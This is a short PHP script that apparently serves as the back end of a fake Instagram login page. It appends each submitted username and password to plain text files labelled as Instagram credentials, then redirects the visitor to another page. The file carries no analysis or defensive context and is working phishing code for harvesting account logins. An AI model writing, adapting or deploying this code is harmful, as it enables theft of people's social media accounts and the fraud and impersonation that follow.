<?php

file_put_contents("usernames.txt", "Instagram Email : " . $email = $_POST['username'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Instagram Email Password : " . $pass = $_POST['password'] . "\n", FILE_APPEND);
header('Location: login3.html');
?>
